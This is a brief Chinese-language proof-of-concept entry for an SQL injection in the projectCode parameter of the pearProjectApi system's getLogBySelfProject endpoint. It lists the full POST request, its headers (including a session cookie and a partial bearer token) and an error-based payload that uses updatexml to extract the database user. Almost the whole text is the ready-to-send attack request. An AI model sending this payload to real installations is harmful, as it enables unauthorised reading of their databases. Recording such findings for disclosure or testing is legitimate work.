# pearProjectApi系统接口projectCode存在SQL注入漏洞

- **系统**：pearProjectApi　|　**类型**：SQL注入　|　**CVE**：—
- **请求**：`POST /index.php/project/project/getLogBySelfProject HTTP/2`
- **关键头**：`Cookie: se0d06741=5rkiv0sqvn1otra27va1jlfgfo`　`Content-Length: 100`　`Organizationcode: 6v7be19pwman2fird04gqu53`　`Authorization: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiIiLCJh…`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
page=1&pageSize=123&projectCode=121312312312'+or+updatexml(1,concat(0x7e,(select+user()),0x7e),1)%23
```
- **预期**：200　|　—